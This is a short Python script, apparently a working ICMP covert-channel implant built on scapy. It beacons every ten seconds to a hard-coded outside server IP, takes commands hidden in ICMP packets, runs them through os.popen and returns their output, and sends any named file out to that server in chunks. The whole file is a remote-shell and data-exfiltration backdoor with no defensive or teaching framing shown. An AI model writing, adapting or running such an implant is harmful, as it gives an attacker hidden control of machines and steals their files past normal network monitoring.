
from scapy.all import sniff, send, Raw
from scapy.layers.inet import IP, ICMP
import os
import time

FRAGMENT_SIZE = 1400
SERVER_IP = '34.165.54.109'

def send_file(file_name, server_ip):
    if not os.path.exists(file_name):
        print(f"File '{file_name}' doesn't exist")
        return

    print(f"Reading '{file_name}'.")

    with open(file_name, "rb") as f:
        while True:
            chunk = f.read(FRAGMENT_SIZE)
            if not chunk:
                break
            send(IP(dst=server_ip) / ICMP(type=14) / chunk, verbose=0)
    print(f"Sending '{file_name}'.")


def client():
    server_ip = SERVER_IP

    while True:
        print("Sending beacon to server.")
        send(IP(dst=server_ip) / ICMP(type=14) / b"beacon")

        time.sleep(10)

        print("Check commands.")
        response = sniff(filter=f"icmp and host {server_ip}", count=1, timeout=5)

        if response:
            pkt = response[0]
            if ICMP in pkt and Raw in pkt:
                received_str = pkt[Raw].load.decode().strip() #errors='ignore'
                print(f"Received: '{received_str}'")
                if os.path.exists(received_str):
                    send_file(received_str, server_ip)
                else:
                    output = os.popen(received_str).read()
                    if output:
                        send(IP(dst=server_ip) / ICMP(type=14) / output.encode(), verbose=0)
                    else:
                        send(IP(dst=server_ip) / ICMP(type=14) / b"", verbose=0)
        else:
            print("No command received.")


if __name__ == "__main__":
    client()
